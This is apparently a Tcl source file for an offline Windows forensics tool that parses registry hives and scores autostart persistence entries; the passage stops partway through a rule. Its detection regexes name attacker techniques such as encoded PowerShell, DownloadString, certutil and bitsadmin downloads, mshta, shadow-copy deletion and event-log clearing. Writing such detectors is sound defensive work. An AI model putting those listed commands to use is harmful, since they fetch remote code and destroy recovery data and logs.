#!/usr/bin/env tclsh
# draugr — the corpse that walks again.
# offline autopsy of windows autostart: registry hives, scheduled tasks.
# one file. zero dependencies. nothing executes, nothing leaves the machine.

set DG_VERSION 0.2

# ---------------------------------------------------------------- byte utils

proc dg_bytes_u16 {bytes off} {
    set off [expr {$off + 0}]
    if {[string length $bytes] < $off + 2} { return 0 }
    binary scan $bytes "@${off} su" v
    return $v
}

proc dg_bytes_u32 {bytes off} {
    set off [expr {$off + 0}]
    if {[string length $bytes] < $off + 4} { return 0 }
    binary scan $bytes "@${off} iu" v
    return $v
}

proc dg_clip {s n} {
    if {[string length $s] <= $n} { return $s }
    return "[string range $s 0 [expr {$n - 2}]]..."
}

proc dg_ascii_clean {s} {
    set out {}
    foreach ch [split $s ""] {
        scan $ch %c code
        if {$code >= 32 && $code < 127} {
            append out $ch
        } else {
            append out "?"
        }
    }
    return $out
}

proc dg_utf16 {bytes} {
    if {[string length $bytes] == 0} { return "" }
    if {[catch {encoding convertfrom unicode $bytes} txt]} {
        return [dg_ascii_clean $bytes]
    }
    return $txt
}

# how many zero bytes (utf-16le ascii text has one per char)
proc dg_zero_count {bytes} {
    set zeros 0
    binary scan $bytes c* arr
    foreach b $arr { if {$b == 0} { incr zeros } }
    return $zeros
}

# ---------------------------------------------------------------- color

set DG_COLOR 1
if {[info exists ::env(NO_COLOR)]} { set DG_COLOR 0 }
if {![info exists ::env(TERM)] || $::env(TERM) eq "dumb"} { set DG_COLOR 0 }

proc dg_disable_color {} { set ::DG_COLOR 0 }

proc dg_paint {code s} {
    if {!$::DG_COLOR} { return $s }
    return "\x1b\[${code}m${s}\x1b\[0m"
}

proc dg_dim   {s} { dg_paint 2 $s }
proc dg_red   {s} { dg_paint "1;31" $s }
proc dg_amber {s} { dg_paint 33 $s }
proc dg_green {s} { dg_paint 32 $s }
proc dg_bold  {s} { dg_paint 1 $s }
proc dg_cyan  {s} { dg_paint 36 $s }

# ---------------------------------------------------------------- verdicts

# severity ranks: low < med < high < crit
# bands: clean(0) watch(1) suspicious(3) hostile(10)
proc dg_sev_rank {sev} {
    switch -- $sev {
        low { return 1 }
        med { return 2 }
        high { return 3 }
        crit { return 4 }
    }
    return 1
}

proc dg_band {score} {
    if {$score >= 3} { return hostile }
    if {$score == 2} { return suspicious }
    if {$score == 1} { return watch }
    return clean
}

proc dg_band_exit {band} {
    switch -- $band {
        clean { return 0 }
        watch { return 1 }
        suspicious { return 3 }
        hostile { return 10 }
    }
    return 2
}

proc dg_band_color {band} {
    switch -- $band {
        clean { return [dg_green $band] }
        watch { return [dg_amber $band] }
        suspicious { return [dg_red $band] }
        hostile { return [dg_red $band] }
    }
    return $band
}

# ---------------------------------------------------------------- json

proc dg_json_escape {s} {
    set map [list \\ \\\\ \" \\\" / \\/ \t \\t \n \\n \r \\r \x01 ? \x02 ? \x03 ?]
    return [string map $map $s]
}

proc dg_json_str {s} {
    return "\"[dg_json_escape $s]\""
}

# ---------------------------------------------------------------- banner

proc dg_banner {} {
    set b "
[dg_dim "  ___              __ _            "]
[dg_dim " |   \\ _ _  _ __  / _(_)_ _  __ __  "]  [dg_bold "draugr"] [dg_dim "v$::DG_VERSION"]
[dg_dim " | |) | '_| '  \\|  _| | ' \\ \\ \\ /  "]  [dg_dim "the corpse that walks again"]
[dg_dim " |___/|_|  |_|_|_|\\__|_|_||_/_\\_\\_  "]  [dg_dim "registry autostart + scheduled tasks"]
"
    return $b
}

proc dg_usage {} {
    return {draugr — offline autopsy of windows autostart. the corpse walks again.

usage:
  draugr scan <path>...          autopsy hives and task xml files
  draugr keys <hive>             walk a hive and print its key tree
  draugr dump <hive> <key>       print every value under one key path
  draugr forge <dir>             generate clean/dirty evidence to try it
  draugr selftest                run the built-in test battery
  draugr rules                   list the checks and their severities
  draugr version

flags:
  --json                         machine output, one json document
  --no-color                     plain text (NO_COLOR is honored too)
  --min-severity <sev>           report only low|med|high|crit and above
  --quiet                        findings only, no banner or notes

exit codes: 0 clean, 1 watch, 3 suspicious, 10 hostile, 2 error.
nothing is executed, nothing leaves the machine.}
}
# ---------------------------------------------------------------- regf reader

# a hive is a byte string. cell offsets are relative to 0x1000 and point at
# the cell size field; the payload starts 4 bytes later.

proc rg_cell {hv off} {
    set base [expr {0x1000 + $off}]
    set len [string length $hv]
    if {$off < 0 || $base + 4 > $len} {
        return -code error "cell out of bounds"
    }
    binary scan $hv "@${base} i" sz
    if {$sz <= 0} {
        return -code error "free or corrupt cell"
    }
    set end [expr {$base + $sz}]
    if {$end > $len} { set end $len }
    return [string range $hv [expr {$base + 4}] [expr {$end - 1}]]
}

proc rg_nk_check {payload} {
    if {[string length $payload] < 0x50} {
        return -code error "short nk cell"
    }
    if {[string range $payload 0 1] ne "nk"} {
        return -code error "not an nk cell"
    }
    return 1
}

proc rg_nk_name {payload} {
    set nlen [dg_bytes_u16 $payload 0x48]
    if {$nlen <= 0 || 0x4C + $nlen > [string length $payload]} { return "" }
    set raw [string range $payload 0x4C [expr {0x4C + $nlen - 1}]]
    set flags [dg_bytes_u16 $payload 2]
    if {$flags & 0x0020} {
        set name [dg_ascii_clean $raw]
    } else {
        set name [dg_utf16 $raw]
    }
    return [string trimright $name "\x00"]
}

proc rg_depress {in outlen} {
    set o ""
    if {$outlen <= 0} { return $o }
    binary scan $in c* arr
    set n [llength $arr]
    set i 0
    while {$i < $n && [string length $o] < $outlen} {
        set flags [expr {[lindex $arr $i] & 0xFF}]
        incr i
        set mask 1
        for {set bit 0} {$bit < 8} {incr bit} {
            if {[string length $o] >= $outlen || $i >= $n} { break }
            if {$flags & $mask} {
                append o [format %c [expr {[lindex $arr $i] & 0xFF}]]
                incr i
            } else {
                if {$i + 2 > $n} { break }
                set tok [expr {(([lindex $arr $i] & 0xFF) << 8) + ([lindex $arr [expr {$i + 1}]] & 0xFF)}]
                incr i 2
                set back [expr {($tok & 0x0FFF) + 1}]
                set clen [expr {($tok >> 12) + 3}]
                for {set k 0} {$k < $clen} {incr k} {
                    set cur [string length $o]
                    if {$cur >= $outlen} { break }
                    if {$cur - $back < 0} { break }
                    append o [string index $o [expr {$cur - $back}]]
                }
            }
            set mask [expr {$mask << 1}]
        }
    }
    return $o
}

# resolve one vk cell into {name type dlen raw}
proc rg_value {hv vkoff} {
    set payload [rg_cell $hv $vkoff]
    if {[string length $payload] < 0x14 || [string range $payload 0 1] ne "vk"} {
        return -code error "not a vk cell"
    }
    set nlen [dg_bytes_u16 $payload 2]
    set dsz  [dg_bytes_u32 $payload 4]
    set doff [dg_bytes_u32 $payload 8]
    set vtype [dg_bytes_u32 $payload 0x0C]
    set vflags [dg_bytes_u16 $payload 0x10]
    set raw ""
    set dlen 0
    if {$nlen == 0} {
        set name "(default)"
    } else {
        set raw [string range $payload 0x14 [expr {0x14 + $nlen - 1}]]
        if {$vflags & 0x0002} {
            set name [string trimright [dg_ascii_clean $raw] "\x00"]
        } else {
            set name [string trimright [dg_utf16 $raw] "\x00"]
            if {[dg_zero_count $raw] == 0 && $nlen > 2} {
                set name [string trimright [dg_ascii_clean $raw] "\x00"]
            }
        }
    }
    if {$dsz == 0} {
        return [list $name $vtype 0 ""]
    }
    if {$dsz & 0x80000000} {
        set len [expr {$dsz & 0x3FFFFFFF}]
        if {$len > 4} { set len 4 }
        set data [string range $payload 8 [expr {8 + $len - 1}]]
        return [list $name $vtype $len $data]
    }
    if {$dsz & 0x40000000} {
        # big data: doff points at a db record listing data chunks
        if {[catch {
            set dbp [rg_cell $hv $doff]
            if {[string range $dbp 0 1] ne "db"} { error "no db sig" }
            set chunks {}
            set total [expr {[string length $dbp] - 8}]
            for {set p 8; set acc 0} {$p + 4 <= [string length $dbp] && $acc < 16384} {incr p 4} {
                binary scan $dbp "@${p} iu" co
                if {$co == 0 || $co == 0xFFFFFFFF} { break }
                set ch [rg_cell $hv $co]
                append chunks $ch
                incr acc [string length $ch]
                if {[string length $chunks] >= ($dsz & 0x3FFFFFFF)} { break }
            }
            error "BIGDATA:[string range $chunks 0 4095]"
        } res opt]} {
            if {[string match "BIGDATA:*" $res]} {
                set data [string range $res 8 end]
                return [list $name $vtype [string length $data] $data]
            }
            return [list $name $vtype 0 ""]
        }
    }
    if {[catch {
        set dp [rg_cell $hv $doff]
        if {$vflags & 0x0001} {
            set want [expr {$dsz & 0x3FFFFFFF}]
            set data [rg_depress $dp $want]
        } else {
            set data $dp
            set want [string length $dp]
        }
    } err]} {
        return [list $name $vtype 0 ""]
    }
    set data [string range $data 0 [expr {($dsz & 0x3FFFFFFF) - 1}]]
    return [list $name $vtype [string length $data] $data]
}

# read the values of one nk; returns list of {name type dlen raw}
proc rg_values {hv payload} {
    set count [dg_bytes_u32 $payload 0x24]
    set listoff [dg_bytes_u32 $payload 0x28]
    set out {}
    if {$count == 0 || $listoff == 0 || $listoff == 0xFFFFFFFF} { return $out }
    if {[catch {
        set lp [rg_cell $hv $listoff]
        set got [dg_bytes_u32 $lp 0]
        if {$got < $count} { set count $got }
        for {set i 0} {$i < $count && $i < 4096} {incr i} {
            set off [dg_bytes_u32 $lp [expr {4 + $i * 4}]]
            if {[catch {lappend out [rg_value $hv $off]} err]} {
                lappend out [list "?unreadable?" 0 0 ""]
            }
        }
    } err]} {
        # value list broken; return what we have
    }
    return $out
}

# read subkey offsets of one nk
proc rg_subkeys {hv payload} {
    set count [dg_bytes_u32 $payload 0x14]
    set listoff [dg_bytes_u32 $payload 0x1C]
    set out {}
    if {$count == 0 || $listoff == 0 || $listoff == 0xFFFFFFFF} { return $out }
    if {[catch {
        set lp [rg_cell $hv $listoff]
        set sig [string range $lp 0 1]
        if {$sig eq "lf" || $sig eq "lh"} {
            set got [dg_bytes_u16 $lp 2]
            if {$got < $count} { set count $got }
            for {set i 0} {$i < $count && $i < 65536} {incr i} {
                set off [dg_bytes_u32 $lp [expr {4 + $i * 8}]]
                if {$off != 0 && $off != 0xFFFFFFFF} { lappend out $off }
            }
        } elseif {$sig eq "li"} {
            set got [dg_bytes_u16 $lp 2]
            if {$got < $count} { set count $got }
            for {set i 0} {$i < $count && $i < 65536} {incr i} {
                set off [dg_bytes_u32 $lp [expr {4 + $i * 4}]]
                if {$off != 0 && $off != 0xFFFFFFFF} { lappend out $off }
            }
        } elseif {$sig eq "ri"} {
            set got [dg_bytes_u16 $lp 2]
            if {$got < $count} { set count $got }
            for {set i 0} {$i < $count && $i < 4096} {incr i} {
                set off [dg_bytes_u32 $lp [expr {4 + $i * 4}]]
                if {$off == 0 || $off == 0xFFFFFFFF} { continue }
                if {[catch {
                    set np [rg_cell $hv $off]
                    foreach c [rg_subkeys_cell $hv $np] { lappend out $c }
                } err2] } { }
            }
        }
    } err]} { }
    return $out
}

# helper for ri entries: payload is already the list cell
proc rg_subkeys_cell {hv lp} {
    set out {}
    set sig [string range $lp 0 1]
    if {$sig eq "lf" || $sig eq "lh"} {
        set count [dg_bytes_u16 $lp 2]
        for {set i 0} {$i < $count && $i < 65536} {incr i} {
            set off [dg_bytes_u32 $lp [expr {4 + $i * 8}]]
            if {$off != 0 && $off != 0xFFFFFFFF} { lappend out $off }
        }
    } elseif {$sig eq "li"} {
        set count [dg_bytes_u16 $lp 2]
        for {set i 0} {$i < $count && $i < 65536} {incr i} {
            set off [dg_bytes_u32 $lp [expr {4 + $i * 4}]]
            if {$off != 0 && $off != 0xFFFFFFFF} { lappend out $off }
        }
    }
    return $out
}

# walk the whole hive; cb is called as cb <fullpath> <valuelist>
# valuelist entries: {name type dlen raw}
proc rg_root_valid {hv off} {
    if {$off == 0 || $off == 0xFFFFFFFF} { return 0 }
    if {[catch {rg_cell $hv $off} payload]} { return 0 }
    if {[string range $payload 0 1] ne "nk"} { return 0 }
    if {[string length $payload] < 0x50} { return 0 }
    set nlen [dg_bytes_u16 $payload 0x48]
    if {$nlen <= 0 || $nlen > 256} { return 0 }
    return 1
}

proc rg_walk {hv cb {maxkeys 250000}} {
    if {[string length $hv] < 0x1040} {
        return -code error "truncated hive"
    }
    if {[string range $hv 0 3] ne "regf"} {
        return -code error "not a regf hive"
    }
    # modern hives keep the root cell offset at 0x24; older layouts at 0x20/0x1C
    set rootoff 0
    foreach cand {0x24 0x20 0x1C} {
        set off [dg_bytes_u32 $hv $cand]
        if {[rg_root_valid $hv $off]} {
            set rootoff $off
            break
        }
    }
    if {$rootoff == 0} {
        return -code error "no root key"
    }
    set visited [dict create]
    set stack [list [list $rootoff "" 0]]
    set seen 0
    while {[llength $stack] > 0} {
        set item [lindex $stack end]
        set stack [lrange $stack 0 end-1]
        lassign $item off path depth
        if {[dict exists $visited $off]} { continue }
        dict set visited $off 1
        incr seen
        if {$seen > $maxkeys} {
            return -code error "hive too large"
        }
        if {[catch {rg_cell $hv $off} payload]} { continue }
        if {[string range $payload 0 1] ne "nk"} { continue }
        set name [rg_nk_name $payload]
        if {$path eq ""} {
            set full $name
        } else {
            set full "${path}\\${name}"
        }
        set vals [rg_values $hv $payload]
        uplevel #0 [list $cb $full $vals]
        if {$depth >= 128} { continue }
        set kids [rg_subkeys $hv $payload]
        foreach k $kids {
            lappend stack [list $k $full [expr {$depth + 1}]]
        }
    }
    return $seen
}

# ---------------------------------------------------------------- value decode

proc rg_type_name {t} {
    set full {REG_NONE REG_SZ REG_EXPAND_SZ REG_BINARY REG_DWORD REG_DWORD_BIG_ENDIAN
        REG_LINK REG_MULTI_SZ REG_RESOURCE_LIST REG_FULL_RESOURCE_DESCRIPTOR
        REG_RESOURCE_REQUIREMENTS_LIST REG_QWORD}
    if {$t >= 0 && $t <= 11} { return [lindex $full $t] }
    return "TYPE$t"
}

proc rg_val_string {v} {
    lassign $v name type dlen raw
    if {$type == 1 || $type == 2} {
        return [string trimright [dg_utf16 $raw] "\x00"]
    }
    if {$type == 7} {
        # multi_sz: utf16 strings separated by nulls
        set parts {}
        set buf ""
        set i 0
        set s [dg_utf16 $raw]
        foreach piece [split $s "\x00"] {
            if {$piece ne ""} { lappend parts $piece }
        }
        return [join $parts " | "]
    }
    if {$type == 4 && $dlen >= 4} {
        binary scan $raw i v32
        return [format "%d (0x%08x)" $v32 [expr {$v32 & 0xFFFFFFFF}]]
    }
    if {$type == 11 && $dlen >= 8} {
        binary scan $raw w v64
        return [format "%d (qword)" $v64]
    }
    if {$dlen == 0} { return "" }
    set head [string range $raw 0 15]
    set hex ""
    binary scan $head H* hx
    return "bin:\[[string toupper $hx]\]"
}

proc dg_val_human {v} {
    lassign $v name type dlen raw
    set tn [rg_type_name $type]
    if {$type == 1 || $type == 2 || $type == 7} {
        return [list $tn [rg_val_string $v]]
    }
    if {$type == 4 || $type == 11} {
        return [list $tn [rg_val_string $v]]
    }
    if {$dlen == 0} { return [list $tn ""] }
    return [list $tn [rg_val_string $v]]
}
# ---------------------------------------------------------------- risk engine

# findings: list of {id sev where why evidence}
set DG_FINDINGS {}
set DG_BENIGN 0
set DG_INPUTS {}

proc dg_finding {id sev where why evidence} {
    lappend ::DG_FINDINGS [list $id $sev [dg_sanitize $where] $why [dg_sanitize $evidence]]
    return 1
}

proc dg_benign {} { incr ::DG_BENIGN }

proc dg_sanitize {s} {
    set s [string map [list \t " " \r " " \n " "] $s]
    return [dg_clip $s 160]
}

proc dg_reset_engine {} {
    set ::DG_FINDINGS {}
    set ::DG_BENIGN 0
    set ::DG_INPUTS {}
}

# ------------------------------------------------- shared command classifiers

# user-writable vs gray vs system path shapes
proc dg_path_zone {s} {
    set t [string tolower $s]
    set user [list %temp% %appdata% %localappdata% %public% "\\users\\" "\\appdata\\" \
        "\\windows\\temp" "\\windows\\tasks" "\\perflogs" "\\recycle" "\\tmp" \
        "\\tracing" "\\windows\\debug" "\\spool\\drivers\\color"]
    foreach u $user {
        if {[string first $u $t] >= 0} { return user }
    }
    set gray [list %programdata% "programdata\\" "\\inetpub"]
    foreach g $gray {
        if {[string first $g $t] >= 0} { return gray }
    }
    if {[string match {*\\windows\\*} $t] || [string match {\\windows\\*} $t]} { return sys }
    if {[string first {\program files} $t] >= 0} { return sys }
    return ""
}

proc dg_first_token {s} {
    set s [string trim $s]
    set s [string trim $s {"}]
    if {[string first " " $s] < 0} { return $s }
    return [lindex [split $s " "] 0]
}

# windows-style basename: split on backslash before using file tail
proc dg_basename {p} {
    set p [string map {\\ /} $p]
    return [file tail $p]
}

# system binary names that have no business living outside system32
proc dg_masquerade {s} {
    set t [string tolower $s]
    set tok [dg_first_token $t]
    set base [dg_basename $tok]
    set sysnames {svchost.exe csrss.exe lsass.exe services.exe smss.exe winlogon.exe
        wininit.exe lsm.exe taskmgr.exe explorer.exe dllhost.exe conhost.exe
        runtimebroker.exe spoolsv.exe dwm.exe searchindexer.exe taskhost.exe
        taskhostw.exe wudfhost.exe}
    set typos {svch0st.exe scvhost.exe csvhost.exe svchosts.exe expiorer.exe
        expl0rer.exe taskmgrs.exe lsasss.exe csrsss.exe svhost.exe}
    set zone [dg_path_zone $s]
    foreach b $typos {
        if {$base eq $b} { return $base }
    }
    foreach b $sysnames {
        if {$base eq $b} {
            if {$zone eq "user" || $zone eq "gray" || $zone eq ""} {
                return $base
            }
            if {[string first {\windows\system32} $t] < 0 && [string first {svchost} $base] >= 0} {
                return $base
            }
        }
    }
    return ""
}

# suspicious verbs and shapes in a command line
proc dg_verbs {s} {
    set t [string tolower $s]
    set high {
        {-enc\M|/enc\M|-ec\M|encodedcommand}
        {-w[ ]*hidden|-windowstyle[ ]*hidden|-window[ ]*hidden}
        {(^|[^a-z])iex\M|invoke-expression}
        {downloadstring|downloadfile|uploadfile|webclient}
        {frombase64string|tobase64string|/decode|-decode}
        {certutil[^|]*(-urlcache|-split|-verifyctl)}
        {bitsadmin[^|]*/(transfer|create|resume)}
        {(^|[^a-z])mshta\M}
        {regsvr32[^|]*/i:http|regsvr32[^|]*://}
        {rundll32[^|]*javascript:}
        {schtasks[^|]*/create}
        {vssadmin[^|]*delete[^|]*shadows}
        {wevtutil[^|]*\ycl\y}
        {bcdedit[^|]*/set}
        {-nop\M|-noni\M|-executionpolicy[ ]*bypass|-ep[ ]*bypass}
        {start-process[^|]*-windowstyle[ ]*hidden}
        {(copy|xcopy)[^|]*\\windows\\system32[^|]*\\users}
    }
    set med {
        {(^|[^a-z])(wscript|cscript)\M[^\|]*\.(vbs|js|jse|wsf|hta)}
        {curl[^|]*http|wget[^|]*http|invoke-webrequest|invoke-restmethod}
        {ftp://}
        {sc[^|]*config[^|]*binpath}
        {netsh[^|]*portproxy}
        {reg[ ]*add[^|]*/v[ ]*(run|runonce)}
    }
    set lows {
        {https?://}
        {[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+(:[0-9]+)?/}
    }
    foreach rx $high {
        if {[regexp -nocase -- $rx $t]} { return [list high $rx] }
    }
    foreach rx $med {
        if {[regexp -nocase -- $rx $t]} { return [list med $rx] }
    }
    foreach rx $lows {
        if {[regexp -nocase -- $rx $t]} { return [list low $rx] }
    }
    return ""
}

# script payloads
proc dg_scripty {s} {
    set t [string tolower $s]
    foreach ext {.ps1 .vbs .vbe .js .jse .wsf .hta .bat .cmd .psm1} {
        if {[string first $ext $t] >= 0} { return 1 }
    }
    return 0
}

# classify one autostart command; context: run | service | task
# returns dict-ish list {sev tag} — "" means benign
proc dg_classify_cmd {cmd args {context run}} {
    set whole [string trim "$cmd $args"]
    if {$whole eq ""} { return "" }
    set masq [dg_masquerade $whole]
    if {$masq ne ""} {
        return [list crit "masquerade: $masq"]
    }
    set v [dg_verbs $whole]
    if {[llength $v] == 2} {
        return [list [lindex $v 0] "suspicious verb"]
    }
    set zone [dg_path_zone "$cmd $args"]
    set scripty [dg_scripty $whole]
    if {$zone eq "user"} {
        set lowt [string tolower "$cmd $args"]
        # known-benign occupants of user-writable locations
        if {[string first {\microsoft\onedrive} $lowt] >= 0} {
            set base [dg_basename [dg_first_token $lowt]]
            if {$base eq "onedrive.exe" || $base eq "onedrivestandaloneupdater.exe"} {
                return ""
            }
        }
        if {$context eq "service"} { return [list crit "service binary in user-writable path"] }
        if {$scripty} { return [list high "script from user-writable path"] }
        return [list med "user-writable path"]
    }
    if {$zone eq "gray"} {
        if {$context eq "service"} { return [list high "service binary in programdata"] }
        if {$scripty} { return [list high "script in programdata"] }
        return [list low "programdata path"]
    }
    if {$zone eq "sys"} {
        if {$scripty} { return [list low "script under windows"] }
        return ""
    }
    # unzoned: bare name or unusual path
    if {$scripty} { return [list med "script reference"] }
    if {$zone eq ""} { return [list low "unusual path"] }
    return ""
}

# ------------------------------------------------- hive rules

# value name hygiene: invisible unicode in autostart value names
proc dg_invisible_name {name} {
    if {$name eq "(default)"} { return 0 }
    foreach ch [split $name ""] {
        scan $ch %c code
        if {($code < 32 && $code != 0) || ($code >= 0x200b && $code <= 0x200f)
            || $code == 0x00ad || $code == 0x2060 || $code == 0xfeff
            || ($code >= 0x202a && $code <= 0x202e)} {
            return 1
        }
    }
    return 0
}

proc dg_ev {prefix vals vname} {
    foreach v $vals {
        lassign $v n t d raw
        if {[string equal -nocase $n $vname]} {
            return [list [rg_val_string $v] $t $d]
        }
    }
    return ""
}

proc dg_rules_hive {full values} {
    set p [string tolower $full]
    set comps [split $p "\\"]
    set nc [llength $comps]
    set tail [lindex $comps end]
    set where_base "key: $full"

    # --- run / runonce / policies run
    if {$tail eq "run" || $tail eq "runonce"
        || [string match {*\policies\explorer\run} $p]} {
        foreach v $values {
            lassign $v n t d raw
            if {$d == 0 && $t == 0} { continue }
            if {$t != 1 && $t != 2 && $t != 7} { continue }
            set txt [rg_val_string $v]
            if {[string trim $txt] eq ""} { continue }
            set wh "hive value $full \\ $n"
            if {[dg_invisible_name $n]} {
                dg_finding A17 med $wh "invisible unicode in autostart value name" $n
            }
            set cls [dg_classify_cmd $txt "" run]
            if {[llength $cls] == 2} {
                lassign $cls sev tag
                dg_finding A01 $sev $wh "run-key entry: $tag" $txt
            } else {
                dg_benign
            }
        }
        return
    }
    if {$tail eq "runonceex"} {
        foreach v $values {
            lassign $v n t d raw
            if {$t != 1 && $t != 2} { continue }
            set txt [rg_val_string $v]
            if {[string trim $txt] eq ""} { continue }
            set wh "hive value $full \\ $n"
            set cls [dg_classify_cmd [string range $txt 2 end] "" run]
            if {[llength $cls] == 2} {
                lassign $cls sev tag
                dg_finding A02 $sev $wh "runonceex entry: $tag" $txt
            } else {
                dg_benign
            }
        }
        return
    }

    # --- command processor autorun
    if {$tail eq "command processor"} {
        set hit [dg_ev "" $values "AutoRun"]
        if {[llength $hit] == 3} {
            lassign $hit txt t d
            if {[string trim $txt] ne ""} {
                set cls [dg_classify_cmd $txt "" run]
                set wh "hive value $full \\ AutoRun"
                if {[llength $cls] == 2} {
                    lassign $cls sev tag
                    dg_finding A03 $sev $wh "cmd.exe AutoRun: $tag" $txt
                } else {
                    dg_benign
                }
            }
        }
        return
    }

    # --- winlogon family
    if {$tail eq "winlogon"} {
        set wh "hive key $full"
        set hit [dg_ev "" $values "Shell"]
        if {[llength $hit] == 3} {
            lassign $hit txt t d
            set norm [string trim [string tolower $txt]]
            if {$norm ne "" && $norm ne "explorer.exe"} {
                set sev med
                if {[dg_path_zone $txt] eq "user"} { set sev high }
                dg_finding A04 $sev $wh "shell replaced" $txt
            } else {
                dg_benign
            }
        }
        set hit [dg_ev "" $values "Userinit"]
        if {[llength $hit] == 3} {
            lassign $hit txt t d
            if {[string trim $txt] ne ""} {
                set parts [split [string trim $txt] ","]
                set ok 0
                set extras {}
                set i 0
                foreach part $parts {
                    set pt [string trim [string tolower $part]]
                    if {$i == 0} {
                        if {[string last "userinit.exe" $pt] == [expr {[string length $pt] - 12}]
                            && [string first {\system32\userinit.exe} $pt] >= 0} {
                            set ok 1
                        }
                    } else {
                        if {$pt ne ""} { lappend extras $part }
                    }
                    incr i
                }
                set sev med
                foreach part $extras {
                    if {[dg_path_zone $part] eq "user"} { set sev high }
                    set cls [dg_classify_cmd $part "" run]
                    if {[llength $cls] == 2 && [lindex $cls 0] eq "crit"} { set sev high }
                }
                if {!$ok} {
                    dg_finding A05 high $wh "userinit does not point at system32" $txt
                } elseif {[llength $extras] > 0} {
                    dg_finding A05 $sev $wh "extra userinit entries" $txt
                } else {
                    dg_benign
                }
            }
        }
        set hit [dg_ev "" $values "Taskman"]
        if {[llength $hit] == 3} {
            lassign $hit txt t d
            if {[string trim $txt] ne ""} {
                set sev med
                if {[dg_path_zone $txt] eq "user"} { set sev high }
                dg_finding A06 $sev $wh "taskman set" $txt
            }
        }
        set hit [dg_ev "" $values "UserinitMprLogonScript"]
        if {[llength $hit] == 3} {
            lassign $hit txt t d
            if {[string trim $txt] ne ""} {
                dg_finding A18 med $wh "logon script CLSID-shape in winlogon" $txt
            }
        }
        return
    }
    if {$nc >= 3 && [lindex $comps end-1] eq "notify"} {
        set parent [lindex $comps end-2]
        if {$parent eq "winlogon"} {
            set hit [dg_ev "" $values "DllName"]
            if {[llength $hit] == 3} {
                lassign $hit txt t d
                if {[string trim $txt] ne ""} {
                    set zone [dg_path_zone $txt]
                    if {$zone eq "user" || $zone eq "gray"} {
                        dg_finding A07 high "hive value $full \\ DllName" "notify package from a writable path" $txt
                    } else {
                        dg_benign
                    }
                }
            }
            return
        }
    }

    # --- appinit
    if {$tail eq "windows" && $nc >= 3
        && [string equal -nocase "currentversion" [lindex $comps end-1]]} {
        set hit [dg_ev "" $values "AppInit_DLLs"]
        if {[llength $hit] == 3} {
            lassign $hit txt t d
            if {[string trim $txt] ne ""} {
                set sev med
                if {[dg_path_zone $txt] eq "user"} { set sev high }
                dg_finding A08 $sev "hive value $full \\ AppInit_DLLs" "appinit_dlls set" $txt
            }
        }
        set hit [dg_ev "" $values "LoadAppInit_DLLs"]
        if {[llength $hit] == 3} {
            lassign $hit txt t d
            if {[string trim $txt] eq "1 (0x00000001)"} {
                dg_finding A08 low "hive value $full \\ LoadAppInit_DLLs" "appinit loader enabled" $txt
            }
        }
        return
    }

    # --- image file execution options
    if {[lindex $comps end-1] eq "image file execution options" && $nc >= 2} {
        set hit [dg_ev "" $values "Debugger"]
        if {[llength $hit] == 3} {
            lassign $hit txt t d
            if {[string trim $txt] ne ""} {
                set lowt [string tolower $txt]
                set known 0
                foreach k {vsjitdebugger.exe windbg.exe ntsd.exe cdb.exe procdump.exe} {
                    if {[string first $k $lowt] >= 0} { set known 1 }
                }
                set sev high
                if {$known && [dg_path_zone $txt] ne "user"} { set sev med }
                dg_finding A09 $sev "hive value $full \\ Debugger" "debugger hijack on [lindex $comps end]" $txt
            }
        }
        return
    }

    # --- lsa packages
    if {$tail eq "lsa"} {
        foreach vn {"Authentication Packages" "Notification Packages" "Security Packages"} {
            set hit [dg_ev "" $values $vn]
            if {[llength $hit] != 3} { continue }
            lassign $hit txt t d
            foreach pkg [split $txt "|"] {
                set pkg [string trim $pkg]
                if {$pkg eq ""} { continue }
                set ok 0
                foreach k {msv1_0 schannel wdigest tspkg pku2u livessp cloudap kerberos scecli} {
                    if {[string equal -nocase $pkg $k]} { set ok 1 }
                }
                if {!$ok} {
                    set sev med
                    if {[string first "\\" $pkg] >= 0 || [string first "/" $pkg] >= 0} { set sev high }
                    if {[dg_path_zone $pkg] eq "user"} { set sev high }
                    dg_finding A10 $sev "hive value $full \\ $vn" "unknown lsa package" $pkg
                }
            }
        }
        return
    }

    # --- bootexecute
    if {$tail eq "session manager"} {
        set hit [dg_ev "" $values "BootExecute"]
        if {[llength $hit] == 3} {
            lassign $hit txt t d
            set norm [string trim [string tolower $txt]]
            if {$norm ne "" && $norm ne "autocheck autochk *"} {
                dg_finding A11 med "hive value $full \\ BootExecute" "native boot execute changed" $txt
            }
        }
        return
    }

    # --- services
    if {$nc >= 2 && [lindex $comps end-1] eq "services"} {
        set hit [dg_ev "" $values "ImagePath"]
        if {[llength $hit] == 3} {
            lassign $hit txt t d
            if {[string trim $txt] ne ""} {
                set cls [dg_classify_cmd $txt "" service]
                set wh "hive value $full \\ ImagePath"
                if {[llength $cls] == 2} {
                    lassign $cls sev tag
                    dg_finding A12 $sev $wh "service binary: $tag" $txt
                } else {
                    dg_benign
                }
            }
        }
        return
    }
    if {$tail eq "parameters" && $nc >= 4 && [lindex $comps end-2] eq "services"} {
        set hit [dg_ev "" $values "ServiceDll"]
        if {[llength $hit] == 3} {
            lassign $hit txt t d
            if {[string trim $txt] ne ""} {
                set cls [dg_classify_cmd $txt "" service]
                set wh "hive value $full \\ ServiceDll"
                if {[llength $cls] == 2} {
                    lassign $cls sev tag
                    dg_finding A13 $sev $wh "service dll: $tag" $txt
                } else {
                    dg_benign
                }
            }
        }
        return
    }

    # --- active setup
    if {$nc >= 3 && [lindex $comps end-1] eq "installed components"
        && [lindex $comps end-2] eq "active setup"} {
        set hit [dg_ev "" $values "StubPath"]
        if {[llength $hit] == 3} {
            lassign $hit txt t d
            if {[string trim $txt] ne ""} {
                set lowt [string tolower $txt]
                set zone [dg_path_zone $txt]
                set wh "hive value $full \\ StubPath"
                if {[string first {regsvr32} $lowt] >= 0 && $zone ne "user" && $zone ne "gray"} {
                    dg_benign
                } else {
                    set cls [dg_classify_cmd $txt "" run]
                    if {[llength $cls] == 2} {
                        lassign $cls sev tag
                        dg_finding A14 $sev $wh "active setup stub: $tag" $txt
                    } else {
                        dg_finding A14 low $wh "active setup stub" $txt
                    }
                }
            }
        }
        return
    }

    # --- print monitors
    if {$nc >= 3 && [lindex $comps end-1] eq "monitors" && [lindex $comps end-2] eq "print"} {
        set hit [dg_ev "" $values "Driver"]
        if {[llength $hit] == 3} {
            lassign $hit txt t d
            if {[string trim $txt] ne ""} {
                set lowt [string tolower $txt]
                set wh "hive value $full \\ Driver"
                set known 0
                foreach k {localspl.dll usbmon.dll} {
                    if {[string equal -nocase $lowt $k]} { set known 1 }
                }
